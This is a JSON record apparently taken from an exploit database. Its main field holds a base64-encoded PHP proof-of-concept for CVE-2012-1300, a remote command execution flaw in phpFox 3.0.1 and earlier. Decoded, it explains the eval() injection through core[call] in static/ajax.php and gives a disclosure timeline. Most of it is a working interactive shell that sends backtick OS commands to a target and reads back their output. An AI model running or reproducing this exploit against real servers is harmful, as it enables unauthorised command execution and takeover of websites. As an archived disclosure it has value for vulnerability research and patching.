{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgIHBocEZveCA8PSAzLjAuMSAoYWpheC5waHApIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiBFeHBsb2l0DQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICANCiAgICBhdXRob3IuLi4uLi4uLi4uLi4uOiBFZ2lkaW8gUm9tYW5vIGFrYSBFZ2lYDQogICAgbWFpbC4uLi4uLi4uLi4uLi4uLjogbjBiMGQxM3NbYXRdZ21haWxbZG90XWNvbQ0KICAgIHNvZnR3YXJlIGxpbmsuLi4uLi46IGh0dHA6Ly93d3cucGhwZm94LmNvbS8NCiAgICANCiAgICArLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICB8IFRoaXMgcHJvb2Ygb2YgY29uY2VwdCBjb2RlIHdhcyB3cml0dGVuIGZvciBlZHVjYXRpb25hbCBwdXJwb3NlIG9ubHkuICAgIHwNCiAgICB8IFVzZSBpdCBhdCB5b3VyIG93biByaXNrLiBBdXRob3Igd2lsbCBiZSBub3QgcmVzcG9uc2libGUgZm9yIGFueSBkYW1hZ2UuIHwNCiAgICArLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICANCiAgICBbLV0gdnVsbmVyYWJsZSBjb2RlIGluIFBocGZveF9Nb2R1bGU6OmdldENvbXBvbmVudCgpIG1ldGhvZCBkZWZpbmVkIGludG8gL2luY2x1ZGUvbGlicmFyeS9waHBmb3gvbW9kdWxlL21vZHVsZS5jbGFzcy5waHANCiAgICANCgk3MTYuCQkJJGFQYXJ0cyA9IGV4cGxvZGUoJy4nLCAkc0NsYXNzKTsNCgk3MTcuCQkJJHNNb2R1bGUgPSAkYVBhcnRzWzBdOwkJDQoJNzE4LgkJCSRzQ29tcG9uZW50ID0gJHNUeXBlIC4gUEhQRk9YX0RTIC4gc3Vic3RyX3JlcGxhY2Uoc3RyX3JlcGxhY2UoJy4nLCBQSFBGT1hfRFMsICRzQ2xhc3MpLCAnJywgMCwgc3RybGVuKCRzTW9kdWxlIC4gUEhQRk9YX0RTKSk7DQoJLi4uDQoJNzQ4LgkJCWlmIChwcmVnX21hdGNoKCcvKC4qPylcKCguKj8pXCkvJywgJHNDb21wb25lbnQsICRhTWF0Y2hlcykgJiYgIWVtcHR5KCRhTWF0Y2hlc1syXSkpDQoJNzQ5LgkJCXsNCgk3NTAuCQkJCWV2YWwoJyRhUGFyYW1zID0gYXJyYXlfbWVyZ2UoJGFQYXJhbXMsIGFycmF5KCcgLiAkYU1hdGNoZXNbMl0gLiAnKSk7Jyk7DQoJNzUxLgkNCgk3NTIuCQkJCSRzQ29tcG9uZW50ID0gJGFNYXRjaGVzWzFdOwkJDQoJNzUzLgkJCQkkc0NsYXNzID0gJGFNYXRjaGVzWzFdOwkJCQ0KCTc1NC4JCQl9DQoJDQoJVGhpcyBtZXRob2QgdXNlcyBpdHMgJHNDbGFzcyBwYXJhbWV0ZXIgIHRvIGNvbnN0cnVjdCB0aGUgJHNDb21wb25lbnQgdmFyaWFibGUgdGhhdCBtaWdodCAgYmUgdXNlZCB0byBpbmplY3QgYW5kIGV4ZWN1dGUJc2VtaS1hcmJpdHJhcnkNCglQSFAgY29kZSBpbiBhIGV2YWwoKSBjYWxsIGF0IGxpbmUgNzUwLiAgRHVlIHRvICRzQ2xhc3MgcGFyYW1ldGVyIGlzICJleHBsb2RlKClkIiBieSBkb3RzIGF0IGxpbmUgNzE2IGFuZHRvIHNhdGlzZnkgIHRoZSByZWdleCAgYXQgbGluZQ0KCTc0OCwgIGlzbid0IHBvc3NpYmxlIHRvIGluamVjdCBjb2RlICB3aGljaCBjb250YWlucyBkb3RzICBvciAgcGFyZW50aGVzZXMsICBidXQgaXMgc3RpbGwgcG9zc2libGUgdG8gaW5qZWN0IHNlbWktYXJiaXRyYXJ5IE9TIGNvbW1hbmRzDQoJbGV2ZXJhZ2luZyBvZiBQSFAncyBiYWNrdGljayBvcGVyYXRvci4gIElucHV0IHBhc3NlZCAgdGhyb3VnaCAkX1BPU1RbY29yZV1bY2FsbF0gIChvciAkX1BPU1RbcGhwZm94XVtjYWxsXSBpbiB2MikgIHRvIC9zdGF0aWMvYWpheC5waHANCglpcyBwYXNzZWQgdG8gZ2V0Q29tcG9uZW50KCkJbWV0aG9kIGFzICRzQ2xhc3MgcGFyYW1ldGVyLg0KCQ0KICAgIFstXSBEaXNjbG9zdXJlIHRpbWVsaW5lOg0KCQ0KCVswNy8wMi8yMDEyXSAtIFZ1bG5lcmFiaWxpdHkgZGlzY292ZXJlZA0KCVswOS8wMi8yMDEyXSAtIFZlbmRvciBub3RpZmllZCB0aHJvdWdoIGh0dHA6Ly93d3cucGhwZm94LmNvbS9jb250YWN0Lw0KCVsyNC8wMi8yMDEyXSAtIENWRSBudW1iZXIgcmVxdWVzdGVkDQoJWzI3LzAyLzIwMTJdIC0gQXNzaWduZWQgQ1ZFLTIwMTItMTMwMA0KCVsyNy8wMi8yMDEyXSAtIFZlbmRvciB1cGRhdGUgcmVsZWFzZWQ6IGh0dHA6Ly93d3cucGhwZm94LmNvbS9ibG9nL3YyLTEtMC1idWlsZC0zLXYzLTAtMS1idWlsZC0zLXJlbGVhc2VkLw0KCVsyMy8wMy8yMDEyXSAtIFB1YmxpYyBkaXNjbG9zdXJlDQoNCiovDQoNCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KaW5pX3NldCgiZGVmYXVsdF9zb2NrZXRfdGltZW91dCIsIDUpOw0KDQpmdW5jdGlvbiBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpDQp7DQogICAgaWYgKCEoJHNvY2sgPSBmc29ja29wZW4oJGhvc3QsIDgwKSkpIGRpZSgiXG5bLV0gTm8gcmVzcG9uc2UgZnJvbSB7JGhvc3R9OjgwXG4iKTsNCiAgICBmcHV0cygkc29jaywgJHBhY2tldCk7DQogICAgcmV0dXJuIHN0cmVhbV9nZXRfY29udGVudHMoJHNvY2spOw0KfQ0KDQpwcmludCAiXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiOw0KcHJpbnQgIlxufCBwaHBGb3ggPD0gMy4wLjEgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uIEV4cGxvaXQgYnkgRWdpWCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1xuIjsNCg0KaWYgKCRhcmdjIDwgMykNCnsNCiAgICBwcmludCAiXG5Vc2FnZS4uLi4uLjogcGhwICRhcmd2WzBdIDxob3N0PiA8cGF0aD5cbiI7DQogICAgcHJpbnQgIlxuRXhhbXBsZS4uLi46IHBocCAkYXJndlswXSBsb2NhbGhvc3QgLyI7DQogICAgcHJpbnQgIlxuRXhhbXBsZS4uLi46IHBocCAkYXJndlswXSBsb2NhbGhvc3QgL3BocGZveC9cbiI7DQogICAgZGllKCk7DQp9DQoNCmxpc3QoJGhvc3QsICRwYXRoKSA9IGFycmF5KCRhcmd2WzFdLCAkYXJndlsyXSk7DQoNCiRyX3BhY2sgID0gIkdFVCB7JHBhdGh9c3RhdGljL3RtcCBIVFRQLzEuMFxyXG4iOw0KJHJfcGFjayAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHJfcGFjayAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiI7DQoNCiRwYWNrZXQgID0gIlBPU1QgeyRwYXRofXN0YXRpYy9hamF4LnBocD9kbz0vYWQvY29tcGxldGUvIEhUVFAvMS4wXHJcbiI7DQokcGFja2V0IC49ICJIb3N0OiB7JGhvc3R9XHJcbiI7DQokcGFja2V0IC49ICJDb250ZW50LUxlbmd0aDogJWRcclxuIjsNCiRwYWNrZXQgLj0gIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbiI7DQokcGFja2V0IC49ICJYX1JFUVVFU1RFRF9XSVRIOiBYTUxIdHRwUmVxdWVzdFxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiVzIjsNCg0Kd2hpbGUoMSkNCnsNCiAgICBwcmludCAiXG5waG9mb3gtc2hlbGwjICI7DQogICAgaWYgKCgkY21kID0gdHJpbShmZ2V0cyhTVERJTikpKSA9PSAiZXhpdCIpIGJyZWFrOw0KCWVsc2UgaWYgKHByZWdfbWF0Y2goJy9cLi8nLCAkY21kKSkgcHJpbnQgIlxuRG90cyBub3QgYWxsb3dlZCFcbiI7DQoJZWxzZSBpZiAocHJlZ19tYXRjaCgnL1wpLycsICRjbWQpKSBwcmludCAiXG5QYXJlbnRoZXNpcyBub3QgYWxsb3dlZCFcbiI7DQoJZWxzZQ0KCXsNCgkJJHBheWxvYWQgPSAiY29yZVtjYWxsXT0uKGB7JGNtZH0+dG1wYCkuIjsNCgkJaHR0cF9zZW5kKCRob3N0LCBzcHJpbnRmKCRwYWNrZXQsIHN0cmxlbigkcGF5bG9hZCksICRwYXlsb2FkKSk7DQoJCSRvdXRwdXQgPSBodHRwX3NlbmQoJGhvc3QsICRyX3BhY2spOw0KCQkhcHJlZ19tYXRjaCgnLzQwNCBub3QvaScsICRvdXRwdXQpICYmIHByZWdfbWF0Y2goJy9cblxyXG4oLiopL3MnLCAkb3V0cHV0LCAkbSkgPyBwcmludCAkbVsxXSA6IGRpZSgiXG5bLV0gRXhwbG9pdCBmYWlsZWQhXG4iKTsNCgl9DQp9", 
    "filename": "platforms/php/webapps/18655.php", 
    "id": "18655", 
    "cves": [
        "CVE-2012-1300"
    ]
}